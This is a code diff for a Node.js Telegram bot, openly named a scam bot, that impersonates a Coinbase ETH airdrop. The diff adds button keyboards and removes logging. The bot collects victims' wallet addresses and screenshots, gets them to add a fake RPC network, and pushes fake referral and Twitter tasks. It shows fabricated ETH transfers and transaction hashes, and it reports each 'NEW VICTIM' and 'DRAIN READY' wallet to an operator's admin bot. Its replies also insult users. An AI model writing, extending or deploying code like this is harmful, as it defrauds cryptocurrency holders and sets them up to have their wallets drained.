@@ -1,13 +1,13 @@
 require('dotenv').config();
-const { Telegraf } = require('telegraf');
+const { Telegraf, Markup } = require('telegraf');
 const express = require('express');
 const axios = require('axios');
 
-// === CONFIG (USING YOUR EXISTING ENV VARS) ===
-const SCAM_BOT_TOKEN = process.env.BOT_TOKEN;           // Already in Render
-const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;    // NEW: Add this
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;        // NEW: Your Telegram ID
-const TENDERLY_RPC = process.env.TENDERLY_RPC;          // Already in Render
+// === CONFIG ===
+const SCAM_BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const TENDERLY_RPC = process.env.TENDERLY_RPC;
 
 // === BOTS ===
 const scamBot = new Telegraf(SCAM_BOT_TOKEN);
@@ -34,7 +34,7 @@ Add this network to Coinbase Wallet:
 **Block Explorer:** https://dashboard.tenderly.co
 `.trim();
 
-// === SEND TO ADMIN BOT ===
+// === SEND TO ADMIN ===
 const sendToAdmin = async (text, photo = null) => {
   try {
     if (photo) {
@@ -42,32 +42,50 @@ const sendToAdmin = async (text, photo = null) => {
     } else {
       await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'Markdown' });
     }
-    console.log('SENT TO ADMIN:', text.substring(0, 50));
   } catch (err) {
     console.error('ADMIN SEND FAILED:', err.message);
   }
 };
 
-// === FAKE ETH SEND (USING YOUR TENDERLY_RPC) ===
+// === FAKE ETH SEND ===
 const sendFakeETH = async (to, eth) => {
   if (!to || to.startsWith('0xFAKE')) return;
   const wei = (eth * 1e18).toString(16);
   try {
     await axios.post(TENDERLY_RPC, {
-      jsonrpc: "2.0",
-      method: "eth_sendTransaction",
-      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }],
-      id: Date.now()
+      jsonrpc: "2.0", method: "eth_sendTransaction",
+      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }], id: Date.now()
     });
-    console.log(`FAKE ETH SENT: ${eth} → ${to}`);
-  } catch (err) {
-    console.log('Fake send failed (ignored):', err.message);
-  }
+  } catch {}
 };
+
+// === BUTTON KEYBOARDS ===
+const walletKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback('Send Wallet + Screenshot', 'send_wallet')]
+]);
+
+const rpcKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback('I Added Network', 'rpc_done')],
+  [Markup.button.callback('Cancel', 'cancel')]
+]);
+
+const rpcProofKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback('Send RPC Proof', 'send_rpc_proof')],
+  [Markup.button.callback('Back', 'back_to_rpc')]
+]);
+
+const twitterKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')],
+  [Markup.button.callback('Back', 'back_to_rpc')]
+]);
+
+const claimKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback('CLAIM $50 ETH', 'claim_eth')],
+  [Markup.button.callback('Cancel', 'cancel')]
+]);
 
 // === /start ===
 scamBot.start(async (ctx) => {
-  console.log('START:', ctx.from.id);
   let user = getUser(ctx.from.id);
   const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;
 
@@ -85,7 +103,6 @@ scamBot.start(async (ctx) => {
     };
     saveUser(user);
 
-    // === REFERRAL PAYOUT ===
     if (refCode) {
       const referrer = getUserByCode(refCode);
       if (referrer && referrer.telegramId !== ctx.from.id) {
@@ -94,28 +111,33 @@ scamBot.start(async (ctx) => {
         updateUser(referrer.telegramId, referrer);
         await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
         scamBot.telegram.sendMessage(referrer.telegramId,
-          `*+1 Referral!* $10 ETH sent.\nTotal: $${referrer.totalEarned}\n` +
-          `Link: t.me/coinbase_eth_airdrop_bot?start=ref_${referrer.referralCode}`
+          `*+1 Referral!* $10 ETH sent.\nTotal: $${referrer.totalEarned}`
         );
       }
     }
 
-    // === SEND NEW VICTIM TO ADMIN ===
     await sendToAdmin(
-      `*NEW VICTIM*\n` +
-      `User: @${user.username}\n` +
-      `ID: \`${user.telegramId}\`\n` +
-      `Ref Code: \`${code}\`\n` +
-      `Referred by: \`${refCode || 'Direct'}\``
+      `*NEW VICTIM*\nUser: @${user.username}\nID: \`${user.telegramId}\`\nRef: \`${code}\``
     );
   }
 
-  ctx.reply(`Drop your Coinbase wallet address + screenshot, fucker.`);
+  ctx.reply(
+    `Drop your Coinbase wallet address + screenshot, fucker.`,
+    walletKeyboard
+  );
 });
 
-// === PHOTO HANDLER ===
+// === BUTTON: SEND WALLET ===
+scamBot.action('send_wallet', async (ctx) => {
+  let user = getUser(ctx.from.id);
+  if (!user) return;
+  user.stage = 'wallet_ss';
+  saveUser(user);
+  ctx.editMessageText(`Send your wallet address + screenshot now.`, { reply_markup: null });
+});
+
+// === PHOTO: WALLET + SS ===
 scamBot.on('photo', async (ctx) => {
-  console.log('PHOTO FROM:', ctx.from.id);
   let user = getUser(ctx.from.id);
   if (!user) return ctx.reply('Use /start first.');
 
@@ -127,16 +149,11 @@ scamBot.on('photo', async (ctx) => {
     saveUser(user);
 
     await sendToAdmin(
-      `*WALLET + SS SUBMITTED*\n` +
-      `User: @${user.username}\n` +
-      `Wallet: \`${user.wallet}\`\n` +
-      `Ref: \`${user.referralCode}\``,
+      `*WALLET + SS*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
       fileId
     );
 
-    ctx.reply(RPC_GUIDE, {
-      reply_markup: { inline_keyboard: [[{ text: "I Added Network", callback_data: "rpc_done" }]] }
-    });
+    ctx.reply(RPC_GUIDE, rpcKeyboard);
     return;
   }
 
@@ -145,13 +162,14 @@ scamBot.on('photo', async (ctx) => {
     saveUser(user);
 
     await sendToAdmin(
-      `*RPC PROOF*\n` +
-      `User: @${user.username}\n` +
-      `Wallet: \`${user.wallet}\``,
+      `*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
       fileId
     );
 
-    ctx.reply(`RPC locked. Now:\n1. Follow @BjExchange53077\n2. Like pinned post\n3. Tag 3 friends\nSend proof.`);
+    ctx.reply(
+      `RPC locked. Now:\n1. Follow @BjExchange53077\n2. Like pinned post\n3. Tag 3 friends`,
+      twitterKeyboard
+    );
     return;
   }
 
@@ -160,19 +178,13 @@ scamBot.on('photo', async (ctx) => {
     saveUser(user);
 
     await sendToAdmin(
-      `*TWITTER PROOF — READY TO DRAIN*\n` +
-      `User: @${user.username}\n` +
-      `Wallet: \`${user.wallet}\`\n` +
-      `Ref Code: \`${user.referralCode}\``,
+      `*TWITTER PROOF — DRAIN READY*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
       fileId
     );
 
     ctx.reply(
       `*Tasks verified!* You earned $50 ETH!\n\nClick to claim:`,
-      {
-        parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[{ text: "CLAIM $50 ETH", callback_data: "claim_eth" }]] }
-      }
+      claimKeyboard
     );
     return;
   }
@@ -180,15 +192,32 @@ scamBot.on('photo', async (ctx) => {
   ctx.reply("Photo received. Keep going, fucker.");
 });
 
-// === BUTTONS ===
+// === BUTTON: RPC DONE ===
 scamBot.action('rpc_done', async (ctx) => {
   let user = getUser(ctx.from.id);
   if (!user || user.stage !== 'rpc_guide') return;
   user.stage = 'rpc_proof';
   saveUser(user);
-  ctx.reply("Send screenshot of Chain ID 90000 now.");
+  ctx.editMessageText(`Send screenshot of Chain ID 90000 now.`, rpcProofKeyboard);
 });
 
+// === BUTTON: SEND RPC PROOF ===
+scamBot.action('send_rpc_proof', async (ctx) => {
+  let user = getUser(ctx.from.id);
+  if (!user || user.stage !== 'rpc_proof') return;
+  ctx.editMessageText(`Send the RPC proof now.`, { reply_markup: null });
+});
+
+// === BUTTON: SEND TWITTER PROOF ===
+scamBot.action('send_twitter_proof', async (ctx) => {
+  let user = getUser(ctx.from.id);
+  if (!user || user.stage !== 'twitter_tasks') return;
+  user.stage = 'twitter_proof';
+  saveUser(user);
+  ctx.editMessageText(`Send proof of Twitter tasks now.`, { reply_markup: null });
+});
+
+// === BUTTON: CLAIM ETH ===
 scamBot.action('claim_eth', async (ctx) => {
   let user = getUser(ctx.from.id);
   if (!user || user.stage !== 'claim_ready') return;
@@ -198,7 +227,7 @@ scamBot.action('claim_eth', async (ctx) => {
   await sendFakeETH(user.wallet, 0.02);
 
   const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
-  ctx.reply(
+  ctx.editMessageText(
     `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
     `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
     `*Share:* t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`,
@@ -206,33 +235,27 @@ scamBot.action('claim_eth', async (ctx) => {
   );
 
   await sendToAdmin(
-    `*CLAIMED $50 ETH*\n` +
-    `User: @${user.username}\n` +
-    `Wallet: \`${user.wallet}\`\n` +
-    `Fake Tx: \`${txHash}\`\n` +
-    `Ref Link: t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`
+    `*CLAIMED $50*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nTx: \`${txHash}\``
   );
 });
 
-// === ERROR HANDLING ===
+// === CANCEL / BACK ===
+scamBot.action('cancel', (ctx) => ctx.editMessageText(`Canceled. Use /start to try again.`));
+scamBot.action('back_to_rpc', (ctx) => ctx.editMessageText(RPC_GUIDE, rpcKeyboard));
+
+// === ERROR & SERVER ===
 scamBot.catch((err, ctx) => {
-  console.error('SCAM BOT ERROR:', err);
+  console.error('ERROR:', err);
   try { ctx.reply('Error. Try again.'); } catch {}
 });
 
-// === SERVER & WEBHOOK ===
 const app = express();
 app.use(express.json());
 app.use(scamBot.webhookCallback(`/bot${SCAM_BOT_TOKEN}`));
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
-  console.log(`Scam bot LIVE on port ${PORT}`);
-  const url = `${process.env.RENDER_EXTERNAL_URL}/bot${SCAM_BOT_TOKEN}`;
-  await scamBot.telegram.setWebhook(url);
-  console.log('Webhook set:', url);
-
-  // Start admin bot (polling — no webhook needed)
+  console.log(`Bot LIVE on ${PORT}`);
+  await scamBot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${SCAM_BOT_TOKEN}`);
   adminBot.launch();
-  console.log('Admin bot polling...');
 });
